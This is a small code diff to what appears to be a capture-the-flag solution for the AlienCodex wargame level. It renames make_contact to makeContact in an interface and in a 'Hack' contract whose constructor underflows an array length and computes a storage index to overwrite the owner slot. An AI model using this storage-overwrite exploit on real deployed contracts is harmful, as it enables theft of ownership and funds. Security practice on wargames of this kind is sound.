@@ -4,7 +4,7 @@ interface IAlienCodex {
     function owner() external view returns (address);
     function codex(uint256) external view returns (bytes32);
     function retract() external;
-    function make_contact() external;
+    function makeContact() external;
     function revise(uint256 i, bytes32 _content) external;
 }
 
@@ -26,7 +26,7 @@ contract Hack {
     h + i = 0 so i = 0 - h
     */
     constructor(IAlienCodex target) {
-        target.make_contact();
+        target.makeContact();
         target.retract();
 
         uint256 h = uint256(keccak256(abi.encode(uint256(1))));
